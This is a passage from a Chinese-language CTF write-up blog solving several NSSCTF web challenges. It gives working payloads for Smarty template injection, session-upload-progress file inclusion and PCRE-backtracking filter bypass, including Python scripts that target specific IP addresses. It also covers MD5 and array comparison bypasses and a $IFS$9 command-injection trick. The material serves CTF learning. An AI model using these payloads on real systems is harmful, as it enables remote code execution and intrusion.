class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Simon Wisselink&quot;,</span><br><span class="line">            &quot;homepage&quot;: &quot;https://www.iwink.nl/&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;support&quot;: &#123;</span><br><span class="line">        &quot;issues&quot;: &quot;https://github.com/smarty-php/smarty/issues&quot;,</span><br><span class="line">        &quot;forum&quot;: &quot;https://github.com/smarty-php/smarty/discussions&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;require&quot;: &#123;</span><br><span class="line">        &quot;php&quot;: &quot;^7.1 || ^8.0&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;autoload&quot;: &#123;</span><br><span class="line">        &quot;classmap&quot;: [</span><br><span class="line">            &quot;libs/&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;extra&quot;: &#123;</span><br><span class="line">        &quot;branch-alias&quot;: &#123;</span><br><span class="line">            &quot;dev-master&quot;: &quot;4.0.x-dev&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;require-dev&quot;: &#123;</span><br><span class="line">        &quot;phpunit/phpunit&quot;: &quot;^8.5 || ^7.5&quot;,</span><br><span class="line">        &quot;smarty/smarty-lexer&quot;: &quot;^3.1&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出来是samrty模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=a&#123;*comment*&#125;b</span><br></pre></td></tr></table></figure>

<p>当我们使用post在第一个界面发送时，界面上出现了ab，这也验证了确实是smarty模板</p>
<p>这里我们就尝试使用各种标签来进行命令执行，最后发现if标签可以成功：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if system(&#x27;ls /f*&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHDCTF%202023%5DSearchMaster%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>推测这是flag所在的文件名字，进行查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if system(&#x27;cat /flag_13_searchmaster&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHDCTF%202023%5DSearchMaster%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>成功拿到flag</p>
<h2 id="羊城杯-2020-easycon"><a href="#羊城杯-2020-easycon" class="headerlink" title="[羊城杯 2020]easycon"></a>[羊城杯 2020]easycon</h2><p>使用diresearch扫描题目网址，发现Index.html，index.php，index.php&#x2F;login，挨着访问，发现inde.php下面出现了弹窗</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>这不是一句话木马的内容嘛，尝试用蚁剑连接</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>蚁剑连接后在html文件夹下发现好几个文件，依次点开在txt文件里发现了许多很像base64的码，但是解码失败，会不会是base64转其他格式的文件？推荐一个网站</p>
<p><a target="_blank" rel="noopener" href="https://onlinetools.com/image/">https://onlinetools.com/image/</a></p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>得到flag，改一下前缀就行</p>
<h2 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果有设置?shell，则?shell的值为其设置的值；若没有设置，则?shell&#x3D;phpinfo();</p>
<p>审计源码，很明显这里直接命令执行应该是无法执行的：</p>
<p>总长度不能大于等于15<br>数字和字母的字符次数不能大于等于8次<br>加上一些filter()的过滤，这里基本无法实现?shell的命令执行</p>
<p>关键在include $_GET[‘file’];，有文件包含，虽然有filter()和长度的限制，但是没有最恶心的CheckNums()；加上给了我们一个phpinfo。查看一下session.upload_progress，默认都是开启的。并且这里记录上传进度的session文件都没有开启自动清除(session.upload_progress.cleanup&#x3D;&#x3D;Off)，条件竞争都不用做了。</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5DEasyCleanup%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>没有给出<code>session.save_path</code>，那sesion应该就是默认保存位置：&#x2F;tmp&#x2F;sess_xxx，但是没有脚本，所以就去网上剽窃了一个</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">myurl = <span class="string">&#x27;http://114.115.134.72:32770/index.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">myfile = io.BytesIO(<span class="string">b&#x27;mochu7&#x27;</span> * <span class="number">1024</span>)</span><br><span class="line">writedata = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php system(&#x27;ls -lha /&#x27;);?&gt;&quot;</span>&#125;</span><br><span class="line">mycookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeshell</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = requests.post(url=myurl, data=writedata, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;mochu7.txt&#x27;</span>, myfile)&#125;, cookies=mycookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload_url = myurl + <span class="string">&#x27;?file=&#x27;</span> + <span class="string">&#x27;/tmp/sess_&#x27;</span> +sessid</span><br><span class="line">        resp = requests.get(url=payload_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;upload_progress&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    writeshell = threading.Thread(target=writeshell, args=(session,))</span><br><span class="line">    writeshell.daemon = <span class="literal">True</span></span><br><span class="line">    writeshell.start()</span><br><span class="line">    getshell(session)</span><br></pre></td></tr></table></figure>

<p>直接跑脚本</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5DEasyCleanup%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>得到flag。</p>
<h2 id="SWPUCTF-2022-新生赛-奇妙的MD5"><a href="#SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="[SWPUCTF 2022 新生赛]奇妙的MD5"></a>[SWPUCTF 2022 新生赛]奇妙的MD5</h2><p>这道题其实很简单，但是设计到一个之前不知道的知识点：</p>
<p>进入页面，发现没什么有用的，拉进火狐看看请求包</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E5%A5%87%E5%A6%99%E7%9A%84MD5%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现了hint:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>

<p>这个东西可以用万能绕过字符：ffifdyop绕过，在跳转后的页面里按f12，查看得到源代码</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E5%A5%87%E5%A6%99%E7%9A%84MD5%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>直接数组绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x[]=1&amp;y[]=2</span><br></pre></td></tr></table></figure>

<p>得到下一步源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;wqh&#x27;]!==$_POST[&#x27;dsy&#x27;]&amp;&amp;md5($_POST[&#x27;wqh&#x27;])===md5($_POST[&#x27;dsy&#x27;]))&#123;</span><br><span class="line">    echo $FLAG;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是数组绕过，直接就得到了flag。</p>
<h2 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h2><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>json_encode:接受一个 JSON 格式的字符串并且把它转换为 PHP 变量,如果是true则返回array并非object，checkdata检测绕过，手段</p>
<p> &#x2F;^.<em>([\w]|^|*|(|~|`|?|/| |||&amp;|!|&lt;|&gt;|{|\x09|\x0a|[).</em>$&#x2F;m  .*有好几个，这里采用回溯绕过</p>
<p>关于回溯绕过，这里参考下面这篇文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/190794.html">PHP利用PCRE回溯次数限制绕过某些安全限制 - FreeBuf网络安全行业门户</a></p>
<p>主要就是回溯次数大于1000000会返回false进行绕过</p>
<ul>
<li><p>系统命令执行用反引号 &#96;，因为别的过滤掉了</p>
</li>
<li><p>eval里面用<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8107#toc-7">短标签 ?&gt;</a> 来绕过过滤echo，无法输出的情况</p>
<p>使用脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://1.14.71.254:28288/&#x27;</span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`sort /f*`?&gt;&quot;,&quot;+&quot;:&quot;&#x27; + &quot;-&quot; * 1000000 + &#x27;&quot;&#125;&#x27;</span><br><span class="line">res = requests.post(url=url, data=&#123;&quot;letter&quot;: payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></li>
</ul>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Dmiddlerce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<h2 id="WUSTCTF-2020-朴实无华"><a href="#WUSTCTF-2020-朴实无华" class="headerlink" title="[WUSTCTF 2020]朴实无华"></a>[WUSTCTF 2020]朴实无华</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>界面什么都没有，f12也没什么有用的，尝试访问robots.txt</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现可以文件，尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>得到假的flag，拉进火狐看看请求头里有没有什么东西</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>在响应头里看见了一个自定义的头，里面还有一个可疑文件，尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>拿到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以看到有三层过滤：</p>
<p>第一层：</p>
<p>传入一个参数num,经过intval函数既要小于2020并且加一要大于2021，看一下这个函数<br>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。<br>我们尝试传入：num&#x3D;2e4</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png" class>

<p>发现成功绕过，现在开始第二层：</p>
<p>就是传进去的值要与他md5加密之后的值一样</p>
<p>直接传值：md5&#x3D;0e215962017</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE6.png" class>

<p>成功绕过，现在看最后一层：</p>
<p>传入的get_flag不能有空格<br>传入的cat会被替换为wctf2020<br>传入的get_flag会当作系统命令被执行<br>我们直接ls看一看有什么</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE7.png" class>

<p>怀疑flag就在最长的那玩意儿里面，既然不准用cat ，那就用有相同功能的tac ，空格就用$IFS$9绕过就行</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE8.png" class>

<p>拿到flag</p>
